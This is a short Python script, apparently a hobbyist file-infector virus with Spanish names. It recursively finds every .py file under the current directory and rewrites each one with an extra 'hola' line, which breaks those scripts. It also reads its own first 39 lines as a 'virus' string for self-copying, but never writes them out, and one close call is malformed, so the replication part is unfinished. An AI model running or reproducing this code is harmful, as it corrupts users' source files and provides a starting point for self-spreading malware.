from descifrar import *
import os

def search(path):
    infectados = []
    archivos = os.listdir(path)
    for nombre in archivos:
        if os.path.isdir(path+"/"+nombre):
            infectados.extend(search(path+"/"+nombre))
        elif nombre[-3:] == ".py":
            infectados.append(path+"/"+nombre)
    return infectados

def infect(infectados):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for nombre in infectados:
        f = open(nombre)
        temp = f.read()
        f.close()
        f = open(nombre,"w")
        f.write(temp+"hola\n")
        f.close()

infect(search(os.path.abspath("")))

